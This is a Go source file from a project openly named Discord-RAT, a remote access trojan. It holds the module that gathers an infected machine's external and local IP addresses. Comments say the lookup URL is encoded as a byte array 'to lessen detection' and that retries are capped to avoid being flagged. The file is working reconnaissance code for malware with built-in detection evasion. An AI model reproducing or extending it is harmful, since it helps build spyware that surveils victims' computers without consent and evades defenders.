/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package system

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
)

var (
	// API to get the external IPV4 address from.
	// This can be changed if the formatting of the IP address returned is the same.
	// Initialized as a byte array to lessen detection (string form: 'http://api.ipify.org').
	IP_API = []byte{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103}

	// IP API request counter.
	// This is used for checking if the MAX_REQ_ATTEMPTS has been reached.
	RequestsToAPI int
)

// GetExternalIP returns the external IP address of the current computer.
//
// The function makes a request to the "http://api.ipify.org" API to retrieve the IP address.
// If an error occurs during the retrieval process or there have been too many requests to the server,
// defined by MAX_REQ_ATTEMPTS, "Unknown" is returned in place of the IP address.
func GetExternalIP() string {
	RequestsToAPI++

	// Use the net/http package to make a GET request to the "http://api.ipify.org" API.
	resp, err := http.Get(string(IP_API))
	if err != nil {
		if RequestsToAPI >= MAX_REQ_ATTEMPTS {
			// We've reached the maximum attempts set,
			// so just return the default IP value.
			return "Unknown"
		} else {
			// Retry getting the IP address.
			return GetExternalIP()
		}
	}

	// Close the response body when the function returns.
	defer resp.Body.Close()

	// Create a byte slice to store the response body.
	var ipBuilder strings.Builder

	// Read the response body to retrieve the IP address as a string.
	buffer := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			ipBuilder.Write(buffer[:n])
		}
		if err != nil {
			break
		}
	}

	// Return the IP address as a string.
	return ipBuilder.String()
}

// GetLocalIP returns the systems local IP address.
func GetLocalIP() string {
	var localAddr = "Unknown"

	// Get the systems host name.
	host, err := os.Hostname()
	if err != nil {
		fmt.Println("Failed to retrieve hostname:", err)
		return localAddr
	}

	// Make an IP lookup using the aforementioned host name.
	addrs, err := net.LookupIP(host)
	if err != nil {
		fmt.Println("Failed to retrieve local IP address:", err)

		return localAddr
	}

	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			localAddr = ipv4.String()
		}
	}

	return localAddr
}

// Maximum retry attempts before returning an empty string from GetExternalIP.
// This is in place to deter constant retries in case the API we're calling is down
// or the request is blocked, as it could be flagged.
const MAX_REQ_ATTEMPTS = 2
